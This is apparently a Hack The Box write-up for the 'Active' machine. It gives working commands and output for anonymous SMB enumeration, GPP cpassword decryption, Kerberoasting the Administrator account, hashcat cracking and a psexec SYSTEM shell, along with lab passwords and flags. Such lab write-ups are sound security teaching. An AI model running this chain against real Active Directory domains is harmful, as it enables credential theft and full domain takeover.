---
title: HTB - Active
date: 2026-10-15 09:33:28 +0000
categories: [HTB, Easy]
tags: [windows, active-directory, smb, gpp, kerberoasting, psexec]
---

## Machine Information

Active is an Easy-rated Windows machine on Hack The Box featuring a Windows Server 2008 R2 Active Directory domain controller. The box demonstrates two classic AD misconfigurations: a Group Policy Preferences (GPP) credential leak via an anonymously readable SMB share, and a Kerberoasting attack against a service account with a weak password.

- **IP:** 10.129.108.70
- **OS:** Windows
- **Difficulty:** Easy
- **Domain:** active.htb

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV 10.129.108.70
```

PORT STATE SERVICE VERSION
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-15 09:33:28Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
49152-49158/tcp open msrpc Microsoft Windows RPC


The port spread (53, 88, 135, 139, 389, 445, 464, 3268) is the signature fingerprint of a Windows domain controller, confirming the `active.htb` domain and `DC` hostname.

### SMB Share Enumeration

Anonymous SMB login succeeded:

```bash
smbclient -L //10.129.108.70 -N
```

Sharename Type Comment

ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
NETLOGON Disk Logon server share
Replication Disk
SYSVOL Disk Logon server share
Users Disk


Checking permissions with smbmap showed the **Replication** share was readable anonymously while everything else required auth:

```bash
smbmap -H 10.129.108.70
```

Disk Permissions Comment

ADMIN$ NO ACCESS Remote Admin
C$ NO ACCESS Default share
IPC$ NO ACCESS Remote IPC
NETLOGON NO ACCESS Logon server share
Replication READ ONLY
SYSVOL NO ACCESS Logon server share
Users NO ACCESS


## Foothold

### GPP Credential Leak

The `Replication` share is the SYSVOL replication source and often contains old Group Policy Preferences files. Browsing it anonymously:

```bash
smbclient //10.129.108.70/Replication -N
```

Inside `active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` was a `Groups.xml` file:

```bash
get Groups.xml
```

```xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2"
        changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description=""
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

GPP passwords are encrypted with a well-known static AES key published by Microsoft, so any `cpassword` value can be decrypted offline:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

GPPstillStandingStrong2k18


This yields valid credentials for `svc_tgs`.

### Validating Credentials

```bash
netexec smb 10.129.108.70 -u svc_tgs -p 'GPPstillStandingStrong2k18' --shares
```

[+] active.htb\svc_tgs:GPPstillStandingStrong2k18
Share Permissions Remark

NETLOGON READ Logon server share
Replication READ
SYSVOL READ Logon server share
Users READ


With valid creds, the `Users` share is now readable:

```bash
smbclient //10.129.108.70/Users -U svc_tgs GPPstillStandingStrong2k18
```

Administrator D 0 Mon Jul 16 06:14:21 2018
SVC_TGS D 0 Sat Jul 21 11:16:32 2018


Grabbed the user flag from `SVC_TGS\Desktop\user.txt`:

b20797df005f403fb19bfd9aa3d2b278


## Privilege Escalation

### Kerberoasting

With a valid domain account in hand, the next step is to check for kerberoastable service accounts:

```bash
impacket-GetUserSPNs -dc-ip 10.129.108.70 active.htb/svc_tgs:'GPPstillStandingStrong2k18' -request
```

ServicePrincipalName Name MemberOf PasswordLastSet LastLogon

active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users... 2018-07-18 15:06:40.351723 2026-10-15 04:54:40.025743


The **Administrator** account itself has an SPN (`active/CIFS:445`), making it kerberoastable. This immediately returns a TGS ticket encrypted with the Administrator's NTLM hash:

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c0d750cf5029cd13033ab2171bef6a59$...


### Cracking the Hash

```bash
hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
```

Status...........: Cracked
Password: Ticketmaster1968


### Administrator Access

With cracked Administrator credentials, dropped straight into a SYSTEM shell via psexec:

```bash
impacket-psexec active.htb/Administrator@10.129.108.70
```

[] Found writable share ADMIN$
[] Uploading file PgkCLHjX.exe
[] Opening SVCManager on 10.129.108.70.....
[] Creating service YpKO on 10.129.108.70.....
[*] Starting service YpKO.....

C:\Windows\system32> whoami
nt authority\system


Grabbed the root flag:

```bash
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

e1f594529cf4a4800856139065baf5d0


## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap service scan identified AD DC |
| Enumeration | Anonymous SMB access to `Replication` share |
| Foothold | GPP `cpassword` decryption → `svc_tgs` credentials |
| Privesc | Kerberoasting Administrator SPN → cracked with rockyou.txt |
| Root | `impacket-psexec` as Administrator → SYSTEM |

**Key takeaway:** Legacy Group Policy Preferences left on SYSVOL/Replication shares remain one of the most common real-world AD footholds, since the GPP encryption key has been public since 2012 (MS14-025). Combined with weak service account passwords vulnerable to Kerberoasting, this chain still shows up in production environments today.
